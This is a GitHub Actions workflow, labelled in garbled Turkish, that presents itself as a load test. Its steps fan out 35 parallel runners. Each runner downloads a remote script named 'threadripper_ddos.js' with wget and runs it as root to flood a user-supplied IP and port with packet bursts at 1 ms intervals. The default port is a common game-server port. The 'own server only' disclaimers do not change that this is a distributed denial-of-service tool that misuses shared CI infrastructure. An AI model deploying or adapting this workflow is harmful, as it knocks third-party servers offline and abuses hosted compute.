name: Vurucu ! (YÃ¼k Testi)

on:
  workflow_dispatch:
    inputs:
      target:
        description: "Hedef IP (KENDÄ° SUNUCUNUZ!)"
        required: true
        default: "127.0.0.1"
      port:
        description: "Hedef Port"
        required: true
        default: "27015"
      threads:
        description: "Worker SayÄ±sÄ± (max 50 Ã¶nerilir)"
        required: false
        default: "35"
      burst:
        description: "Burst baÅŸÄ±na paket (500 Ã¶nerilir)"
        required: false
        default: "500"
      interval:
        description: "Burst arasÄ± bekleme (ms)"
        required: false
        default: "1"

jobs:
  load-test:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 35
      matrix:
        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35]

    steps:
      - name: Sistem HazÄ±rlÄ±ÄŸÄ±
        run: |
          sudo apt-get update -y
          sudo apt-get install -y nodejs npm
          node -v && npm -v

      - name: Threadripper Scripti Ä°ndir
        run: |
          wget https://raw.githubusercontent.com/kullanici-adin/threadripper-test/main/threadripper_ddos.js -O threadripper.js
          chmod +x threadripper.js

      - name: YÃ¼k Testini BaÅŸlat (30 Saniye)
        timeout-minutes: 2
        run: |
          TARGET="${{ inputs.target }}"
          PORT="${{ inputs.port }}"
          THREADS="${{ inputs.threads }}"
          BURST="${{ inputs.burst }}"
          INTERVAL="${{ inputs.interval }}"

          echo "ðŸŒ€ THREADRIPPER YÃœK TESTÄ° BAÅžLIYOR ðŸŒ€"
          echo "Hedef: $TARGET:$PORT"
          echo "Worker: $THREADS | Burst: $BURST | Interval: ${INTERVAL}ms"
          echo "SÃ¼re: 30 saniye (otomatik kapanÄ±r)"

          sudo timeout 35 node threadripper.js "$TARGET:$PORT" "$THREADS" "$INTERVAL" 100 30000 "$BURST" || true

      - name: TamamlandÄ±
        run: |
          echo "âœ… YÃ¼k testi tamamlandÄ±."
          echo "Not: Sadece izinli sistemlerde kullanÄ±n."
